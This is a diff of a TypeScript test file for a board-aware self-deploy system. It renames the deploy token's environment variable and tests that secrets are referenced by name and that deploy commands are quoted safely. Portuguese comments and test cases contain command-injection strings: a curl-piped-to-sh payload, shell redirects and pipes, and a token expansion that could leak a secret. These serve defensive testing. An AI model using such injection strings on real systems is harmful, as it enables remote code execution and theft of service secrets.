@@ -134,8 +134,8 @@ describe("deployBoard — Fase 4c board-aware deploy", () => {
     expect(res.fired).toBe(true);
     expect(res.settleArmed).toBe(true); // the effect will stamp deployFiredAt so the watchdog can catch a dead restart
     const cmd = calls[0];
-    expect(cmd).toContain("--setenv=STORYMAP_MCP_TOKEN"); // token IMPORTED from the service env, not interpolated
-    expect(cmd).toContain("deploy-webhook?secret=$STORYMAP_MCP_TOKEN"); // referenced by name — value never inline
+    expect(cmd).toContain("--setenv=AGILEHARNESS_MCP_TOKEN"); // token IMPORTED from the service env, not interpolated
+    expect(cmd).toContain("deploy-webhook?secret=$AGILEHARNESS_MCP_TOKEN"); // referenced by name — value never inline
     expect(cmd).toContain("--retry-connrefused"); // MANDATORY: the restart window is connection-refused
     // POSIX single-quoted bash -c arg → the outer shell must NOT expand the script's own $PF/$STATUS/$(...)
     expect(cmd).toContain("bash -c '");
@@ -219,7 +219,7 @@ describe("buildSelfDeployScript — self-deploy settle loop (WS1.1)", () => {
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
     });
 
@@ -279,7 +279,7 @@ describe("buildSelfDeployScript — self-deploy settle loop (WS1.1)", () => {
     expect(s).toContain('"board":"storymap"');
     expect(s).toContain('"cardId":"story-x"');
     expect(s).toContain('"phase":"self-deploy"');
-    expect(s).toContain("deploy-webhook?secret=$STORYMAP_MCP_TOKEN"); // token by NAME, not value
+    expect(s).toContain("deploy-webhook?secret=$AGILEHARNESS_MCP_TOKEN"); // token by NAME, not value
   });
 
   it("attaches a base64 logTail ONLY on the failed branch (forensics without JSON-escaping hell)", () => {
@@ -296,7 +296,7 @@ describe("buildSelfDeployScript — self-deploy settle loop (WS1.1)", () => {
       repoRoot: "/repo",
       toolPackageDir: "/repo/packages/storymap-ui",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/l",
     });
     expect(manual).toContain("bun run build:staged");
@@ -318,7 +318,7 @@ describe("buildSelfDeployScript — post-build surface publish (story-zr1cmf)", 
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
       postBuildCommands: [CMD],
     });
@@ -349,7 +349,7 @@ describe("buildSelfDeployScript — post-build surface publish (story-zr1cmf)", 
       repoRoot: "/repo",
       toolPackageDir: "/repo/packages/storymap-ui",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/l",
       postBuildCommands: [CMD],
     });
@@ -366,7 +366,7 @@ describe("buildSelfDeployScript — post-build surface publish (story-zr1cmf)", 
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
     });
     expect(card).not.toContain("bash -lc");
@@ -960,7 +960,7 @@ describe("self-deploy — o passo privilegiado não interpreta dado declarado (s
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
       postBuildCommands: cmds,
     });
@@ -1091,7 +1091,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
       postBuildCommands: cmds,
     });
@@ -1193,7 +1193,7 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
     // A DIVERGÊNCIA entre os dois lados da fronteira. O parser trata `"…"` como agrupamento LITERAL; o
     // `bash -lc` do outro lado do registry NÃO: dentro de aspas duplas ele EXPANDE `$VAR` e EXECUTA
     // `$(…)`. Enquanto a string crua seguia adiante, um alvo autorizado bastava — `vercel deploy --msg
-    // "$(curl http://x/p | sh)"` roda o payload como root, e `"$STORYMAP_MCP_TOKEN"` vaza o segredo do
+    // "$(curl http://x/p | sh)"` roda o payload como root, e `"$AGILEHARNESS_MCP_TOKEN"` vaza o segredo do
     // serviço para dentro dos argumentos. A fronteira normaliza: cada palavra autorizada vai citada.
     const { exec } = recordingExec();
     const f = specLauncher();
@@ -1218,11 +1218,11 @@ describe("self-deploy — allow-list de lançadores: interpretador nunca é alvo
       boardPackage: undefined,
       board: "nest",
       cardId: "s2",
-      boardDeploy: { kind: "command", command: `vercel deploy --msg "$STORYMAP_MCP_TOKEN"` },
+      boardDeploy: { kind: "command", command: `vercel deploy --msg "$AGILEHARNESS_MCP_TOKEN"` },
       productDeploy: new ProductDeployRegistry(f.launcher),
     });
     expect(leak.fired).toBe(true);
-    expect((f.started[1]?.spec as { command: string }).command).toBe(`'vercel' 'deploy' '--msg' '$STORYMAP_MCP_TOKEN'`);
+    expect((f.started[1]?.spec as { command: string }).command).toBe(`'vercel' 'deploy' '--msg' '$AGILEHARNESS_MCP_TOKEN'`);
   });
 
   it("a allow-list é do OPERADOR (env), nunca do board — e nem por env um interpretador entra", () => {
@@ -1293,7 +1293,7 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-dlsxfj
       board: "storymap",
       cardId: "story-x",
       webhookBase: "http://127.0.0.1:3008",
-      tokenEnvName: "STORYMAP_MCP_TOKEN",
+      tokenEnvName: "AGILEHARNESS_MCP_TOKEN",
       logPath: "/repo/storymap/.runner/self-deploy.log",
       postBuildCommands: cmds,
     });
@@ -1332,7 +1332,7 @@ describe("self-deploy — a cadeia lançador→receita→argumento (story-dlsxfj
       [`just sync-web-terminal '\${HOME}'`, "${HOME}"],
       // o segredo do serviço vive no script (na URL do settle) — o needle é a FORMA citada que só
       // apareceria se o argumento tivesse aterrissado como parâmetro da receita.
-      [`just sync-web-terminal '"$STORYMAP_MCP_TOKEN"'`, `"$STORYMAP_MCP_TOKEN"`],
+      [`just sync-web-terminal '"$AGILEHARNESS_MCP_TOKEN"'`, `"$AGILEHARNESS_MCP_TOKEN"`],
       ["just sync-web-terminal 'x > /tmp/pwn'", "/tmp/pwn"],
       ["just sync-web-terminal 'a | sh'", "a | sh"],
     ] as [string, string][]) {
